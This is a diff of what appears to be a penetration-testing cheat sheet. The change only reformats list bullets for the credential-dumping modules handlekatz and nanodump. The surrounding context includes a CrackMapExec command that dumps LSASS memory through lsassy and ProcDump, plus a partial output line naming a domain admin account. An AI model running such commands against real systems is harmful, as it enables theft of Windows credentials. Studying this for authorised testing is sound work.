@@ -269,8 +269,8 @@ If the lsassy module fails, then use the following instead using [sysinternals p
 
 Other modules that can be used.
 
-* handlekatz
-* nanodump
+- handlekatz
+- nanodump
 
 ```plain
 cme smb <target> -u <user> -p <password> -M lsassy -o DUMP_METHOD=2 PROCDUMP_PATH=/sysinternals/procdump.exe
@@ -394,8 +394,8 @@ PROCDUMP    10.10.10.10     445    IITJUMPHOST      offsec.NL\adm_johndo ThisPas
 
 Other modules that can be used.
 
-* handlekatz
-* nanodump
+- handlekatz
+- nanodump
 
 ### Dump SAM (local-authentication)
 
